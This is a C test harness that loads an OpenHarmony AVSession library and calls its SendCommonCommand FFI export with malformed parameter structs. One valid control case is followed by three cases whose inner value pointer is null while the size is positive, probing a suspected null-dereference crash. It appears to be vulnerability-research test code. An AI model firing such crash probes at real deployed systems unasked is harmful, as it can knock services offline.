/* Malformed-input client for the OpenHarmony x86_64 CJ AVSession exported ABI.
 * ABI source: multimedia_av_session frameworks/cj (CArray/CParameters from CJ
 * common types; FFI exports from cj_avsession_controller_ffi.cpp).
 * Candidate under test: SendCommonCommand dispatches CArray→CParameters by
 * valueType; the Inner*Array* converters iterate value[i] with head->size
 * without checking value for null (nested pointer, one level deeper than IPC).
 * No target implementation is copied into this client.
 *
 * Case matrix (each prints start/done markers unbuffered):
 *   0  CArray{valid 1 int param}           control: normal dispatch path
 *   1  CParameters{value=NULL, size=5, STR_PTR_TYPE}   candidate: null inner value
 *   2  CParameters{value=NULL, size=3, I32_PTR_TYPE}   variant: int32 array
 *   3  CParameters{value=NULL, size=2, DOUBLE_PTR_TYPE} variant: double array
 * Either outcome of case 1-3 is a valid result (crash vs returned error).
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* CJ common types (from account_os_account/appaccount_defination.h, same
 * shape used across all CJ FFI components) */
typedef struct {
    int8_t valueType;
    char *key;
    void *value;
    int64_t size;
} CParameters;

typedef struct {
    CParameters *head;
    int64_t size;
} CArray;

/* valueType constants (from cj_avsession_utils.cpp source reading) */
enum {
    NONE_VALUE = 0,
    I32_TYPE = 1,
    DOUBLE_TYPE = 2,
    STR_TYPE = 3,
    BOOL_TYPE = 4,
    FD_TYPE = 5,
    HASH_MAP_TYPE = 6,
    STR_PTR_TYPE = 7,
    I32_PTR_TYPE = 8,
    BOOL_PTR_TYPE = 9,
    DOUBLE_PTR_TYPE = 10,
    FD_PTR_TYPE = 11,
};

_Static_assert(sizeof(void *) == 8, "x86_64 caller required");

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    if (argc != 2) return 2;
    void *library = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
    if (!library) { fprintf(stderr, "load_error=%s\n", dlerror()); return 3; }

    /* FFI export: int32_t FfiMultimediaAVSessionControllerSendCommonCommand(
     *     char *sessionId, char* command, CArray* args) */
    int32_t (*send_command)(char *, char *, CArray *) =
        (int32_t (*)(char *, char *, CArray *))dlsym(library,
            "FfiMultimediaAVSessionControllerSendCommonCommand");
    if (!send_command) { fputs("missing AVSession export\n", stderr); return 4; }

    /* Case 0: control — valid int32 param */
    int32_t valid_int = 42;
    CParameters p0 = { I32_TYPE, "k0", &valid_int, 1 };
    CArray arr0 = { &p0, 1 };

    /* Cases 1-3: null inner value with positive size, different PTR types */
    CParameters p1 = { STR_PTR_TYPE, "k1", NULL, 5 };
    CArray arr1 = { &p1, 1 };
    CParameters p2 = { I32_PTR_TYPE, "k2", NULL, 3 };
    CArray arr2 = { &p2, 1 };
    CParameters p3 = { DOUBLE_PTR_TYPE, "k3", NULL, 2 };
    CArray arr3 = { &p3, 1 };

    const struct { CArray *arr; const char *name; } cases[] = {
        { &arr0, "valid_i32_control" },
        { &arr1, "null_value_strptr_candidate" },
        { &arr2, "null_value_i32ptr_variant" },
        { &arr3, "null_value_dblptr_variant" },
    };
    for (size_t k = 0; k < sizeof(cases) / sizeof(cases[0]); k++) {
        printf("case=%zu name=%s start head=%p size=%lld vt=%d\n", k, cases[k].name,
               (void *)cases[k].arr->head, (long long)cases[k].arr->size,
               (int)cases[k].arr->head->valueType);
        int32_t rc = send_command((char *)"validation.session", (char *)"valid_command", cases[k].arr);
        printf("case=%zu name=%s done rc=%d\n", k, cases[k].name, rc);
    }
    puts("malformed_matrix=completed_no_crash");
    return 0;
}
